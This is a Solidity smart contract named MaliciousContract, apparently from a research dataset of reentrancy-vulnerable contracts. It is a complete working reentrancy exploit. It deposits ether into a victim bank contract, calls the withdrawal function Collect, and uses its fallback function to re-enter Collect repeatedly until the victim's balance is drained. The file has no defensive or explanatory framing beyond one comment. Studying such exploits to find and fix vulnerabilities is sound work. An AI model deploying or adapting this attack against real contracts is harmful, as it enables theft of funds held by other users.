pragma solidity ^0.4.25;

import "../dataset/reentrancy/0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol";


contract MaliciousContract{
    MY_BANK my_bank;
    

    constructor(address _victimAddress) public{
        my_bank= MY_BANK (_victimAddress);
    }

   function attack(uint amount) public {
        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
        my_bank.Collect(amount);
    }

    function deposit()  public payable{
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        my_bank.Put.value(msg.value)(0);        
    }

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if ( address(my_bank).balance >= 1 ether) {
            my_bank.Collect(1 ether);
        }
    }
}